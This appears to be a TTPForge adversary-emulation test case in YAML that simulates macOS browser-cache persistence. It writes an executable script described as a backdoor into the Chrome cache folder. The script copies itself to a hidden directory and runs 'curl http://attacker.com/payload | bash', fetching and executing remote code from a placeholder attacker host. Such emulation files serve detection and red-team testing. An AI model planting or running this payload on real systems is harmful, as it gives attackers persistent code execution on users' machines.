---
api_version: 2.0
uuid: a3ac2335-9666-4542-af4e-bcd9c9ef2672
name: Browser cache persistence
authors:
- TTPForge
description: |
  Uses browser cache for persistent backdoor installation and payload delivery
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1005 Data from Local System
requirements:
  platforms:
  - os: darwin
args:
- name: browser_cache_dir
  description: Path to browser cache directory
  type: string
  default: ~/Library/Caches/Google/Chrome
- name: payload_file
  description: Name of payload file to cache
  type: string
  default: cache_payload.bin
- name: cache_key
  description: Cache key identifier
  type: string
  default: persistent_cache_key
steps:
- name: create_cache_directory
  inline: mkdir -p {{ .Args.browser_cache_dir }}
  cleanup:
    inline: |-
      rm -f "{{ .Args.browser_cache_dir }}/{{ .Args.payload_file }}"
      rm -f "{{ .Args.browser_cache_dir }}/cache_index.dat"
      rm -rf ~/.cache_backup
- name: create_cached_payload
  create_file: '{{ .Args.browser_cache_dir }}/{{ .Args.payload_file }}'
  contents: |
    #!/bin/bash
    # Cached payload
    # This file serves as a persistent backdoor
    # Executed when browser cache is loaded

    # Maintain persistence
    mkdir -p ~/.cache_backup
    cp "$0" ~/.cache_backup/$(date +%s).bin

    # Execute malicious operations
    curl -s http://attacker.com/payload | bash &
  mode: 493
  cleanup: default
- name: create_cache_index
  create_file: '{{ .Args.browser_cache_dir }}/cache_index.dat'
  contents: |
    // Cache index mapping
    // Persistence key: {{ .Args.cache_key }}
    // Payload: {{ .Args.payload_file }}
    // Execution: auto-load
  mode: 420
  cleanup: default
tests:
- name: dry_run_test
  dry_run: true
